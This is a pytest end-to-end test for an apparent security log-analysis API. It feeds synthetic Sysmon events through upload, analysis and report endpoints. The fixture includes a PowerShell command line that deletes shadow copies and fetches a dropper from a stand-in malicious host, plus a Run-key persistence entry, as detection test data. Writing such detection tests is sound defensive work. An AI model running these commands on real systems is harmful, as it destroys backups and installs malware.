from __future__ import annotations

import json
from pathlib import Path

from fastapi.testclient import TestClient

from app.core.config import settings
from app.db.base import AnalysisRecord
from app.db.session import SessionLocal
from app.main import app


ANALYZE_RESPONSE_KEYS = {"analysis_id", "status", "message", "result"}
ANALYSIS_RECORD_KEYS = {
    "analysis_id",
    "filename",
    "saved_path",
    "sha256",
    "status",
    "result",
    "error",
}
RESULT_KEYS = {
    "summary",
    "risk_level",
    "key_findings",
    "iocs",
    "llm_report",
    "attack_chains",
    "abstracted_attack_chains",
    "rule_results",
    "suspicious_results",
    "artifact_paths",
}
SUMMARY_KEYS = {
    "parsed_events",
    "sysmon_events",
    "sysmon_core_events",
    "attack_chains",
    "suspicious_chains",
    "risk_level",
    "ioc_counts",
    "events_by_type",
}
IOC_KEYS = {
    "ips",
    "domains",
    "urls",
    "hashes",
    "file_paths",
    "registry_keys",
    "ransom_notes",
    "encrypted_extensions",
    "suspicious_file_names",
    "bitcoin_addresses",
    "email_addresses",
}
RULE_RESULT_KEYS = {
    "process_guid",
    "image",
    "command_line",
    "parent_image",
    "user",
    "start_time",
    "event_count",
    "features",
    "indicators",
    "score",
    "label",
    "reasons",
    "actions",
    "mitre_attack",
    "ml_result",
}
ML_RESULT_KEYS = {"enabled", "label", "confidence", "reason", "feature_columns"}
LLM_REPORT_KEYS = {
    "schema_version",
    "analysis_id",
    "summary",
    "key_findings",
    "iocs",
    "mitre_attack",
    "suspicious_processes",
    "attack_chain_summaries",
    "reporting_instruction",
}
ARTIFACT_KEYS = {
    "parsed_events",
    "sysmon_events",
    "sysmon_core_events",
    "attack_chains",
    "abstracted_attack_chains",
    "rule_results",
    "suspicious_results",
    "llm_report",
    "report",
}


def _sysmon_event(
    event_id: int,
    timestamp: str,
    event_data: dict[str, str],
    message: str | None = None,
) -> dict:
    return {
        "@timestamp": timestamp,
        "message": message or f"Sysmon event {event_id}",
        "event": {
            "code": str(event_id),
            "kind": "event",
            "provider": "Microsoft-Windows-Sysmon",
        },
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": event_id,
            "record_id": event_id,
            "computer_name": "e2e-host",
            "provider_name": "Microsoft-Windows-Sysmon",
            "event_data": event_data,
            "process": {"pid": 1000},
        },
        "host": {
            "name": "e2e-host",
            "hostname": "e2e-host",
            "os": {"name": "Windows"},
        },
        "agent": {"type": "winlogbeat", "version": "8.0.0"},
        "log": {"level": "information"},
    }


def _sample_winlogbeat_jsonl() -> bytes:
    process_guid = "{E2E-PROCESS-GUID}"
    common = {
        "ProcessGuid": process_guid,
        "ProcessId": "4321",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": (
            "powershell.exe -NoProfile -EncodedCommand "
            "vssadmin delete shadows /all /quiet; "
            "iwr http://malicious.example.com/dropper.exe"
        ),
        "User": r"E2E\analyst",
        "ParentProcessGuid": "{E2E-PARENT-GUID}",
        "ParentProcessId": "900",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "ParentCommandLine": "cmd.exe /c run-test",
    }
    events = [
        _sysmon_event(
            1,
            "2026-05-25T10:00:00Z",
            {
                **common,
                "Hashes": (
                    "SHA256="
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                ),
            },
            "PowerShell launched with shadow copy deletion command",
        ),
        _sysmon_event(
            3,
            "2026-05-25T10:00:01Z",
            {
                **common,
                "DestinationIp": "8.8.8.8",
                "DestinationPort": "443",
                "SourceIp": "10.0.0.5",
                "SourcePort": "51000",
                "Protocol": "tcp",
            },
            "Network connection to malicious.example.com",
        ),
        _sysmon_event(
            11,
            "2026-05-25T10:00:02Z",
            {**common, "TargetFilename": r"C:\Users\Public\locked-1.txt"},
        ),
        _sysmon_event(
            11,
            "2026-05-25T10:00:03Z",
            {**common, "TargetFilename": r"C:\Users\Public\locked-2.txt"},
        ),
        _sysmon_event(
            11,
            "2026-05-25T10:00:04Z",
            {**common, "TargetFilename": r"C:\Users\Public\locked-3.txt"},
        ),
        _sysmon_event(
            13,
            "2026-05-25T10:00:05Z",
            {
                **common,
                "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\E2E",
                "Details": r"C:\Users\Public\dropper.exe",
            },
        ),
    ]
    return "\n".join(json.dumps(event) for event in events).encode("utf-8")


def _cleanup_analysis_record(analysis_id: str) -> None:
    db = SessionLocal()
    try:
        record = db.get(AnalysisRecord, analysis_id)
        if record is not None:
            db.delete(record)
            db.commit()
    finally:
        db.close()


def test_upload_analyze_result_pipeline_creates_llm_report(monkeypatch, tmp_path):
    data_dir = tmp_path / "data"
    monkeypatch.setattr(settings, "data_dir", data_dir)
    monkeypatch.setattr(settings, "upload_dir", data_dir / "uploads")
    monkeypatch.setattr(settings, "parsed_dir", data_dir / "parsed")
    monkeypatch.setattr(settings, "normalized_dir", data_dir / "normalized")
    monkeypatch.setattr(settings, "analyzed_dir", data_dir / "analyzed")
    monkeypatch.setattr(settings, "reports_dir", data_dir / "reports")

    analysis_id = None

    try:
        with TestClient(app) as client:
            health_response = client.get("/health")

            assert health_response.status_code == 200
            assert health_response.json()["status"] == "ok"

            upload_response = client.post(
                "/upload",
                files={
                    "file": (
                        "e2e_sample.jsonl",
                        _sample_winlogbeat_jsonl(),
                        "application/x-ndjson",
                    )
                },
            )

            assert upload_response.status_code == 200
            upload_body = upload_response.json()
            analysis_id = upload_body["analysis_id"]
            assert upload_body["status"] == "uploaded"
            assert Path(upload_body["saved_path"]).is_file()

            analyze_response = client.post(f"/analyze/{analysis_id}")

            assert analyze_response.status_code == 200
            analyze_body = analyze_response.json()
            assert set(analyze_body) == ANALYZE_RESPONSE_KEYS
            assert analyze_body["status"] == "completed"

            result = analyze_body["result"]
            assert set(result) == RESULT_KEYS
            assert set(result["summary"]) == SUMMARY_KEYS
            assert set(result["iocs"]) == IOC_KEYS
            assert result["summary"]["parsed_events"] == 6
            assert result["summary"]["sysmon_events"] == 6
            assert result["summary"]["sysmon_core_events"] == 6
            assert result["summary"]["attack_chains"] >= 1
            assert result["summary"]["suspicious_chains"] >= 1
            assert result["risk_level"] == "high"
            assert "8.8.8.8" in result["iocs"]["ips"]
            assert "malicious.example.com" in result["iocs"]["domains"]
            first_rule_result = result["rule_results"][0]
            assert set(first_rule_result) == RULE_RESULT_KEYS
            assert first_rule_result["ml_result"] is not None
            assert set(first_rule_result["ml_result"]) == ML_RESULT_KEYS
            assert first_rule_result["ml_result"]["enabled"] is True
            assert first_rule_result["ml_result"]["label"] in {"benign", "suspicious"}
            assert set(result["llm_report"]) == LLM_REPORT_KEYS

            artifact_paths = result["artifact_paths"]
            assert set(artifact_paths) == ARTIFACT_KEYS
            for artifact_path in artifact_paths.values():
                assert Path(artifact_path).is_file()

            llm_report_path = Path(artifact_paths["llm_report"])
            llm_report = json.loads(llm_report_path.read_text(encoding="utf-8"))
            assert llm_report["analysis_id"] == analysis_id
            assert llm_report["summary"]["risk_level"] == "high"
            assert llm_report["suspicious_processes"]
            assert "reporting_instruction" in llm_report

            result_response = client.get(f"/result/{analysis_id}")

            assert result_response.status_code == 200
            stored_body = result_response.json()
            assert set(stored_body) == ANALYSIS_RECORD_KEYS
            assert stored_body["status"] == "completed"
            assert stored_body["result"]["artifact_paths"]["llm_report"] == str(llm_report_path)
    finally:
        if analysis_id is not None:
            _cleanup_analysis_record(analysis_id)
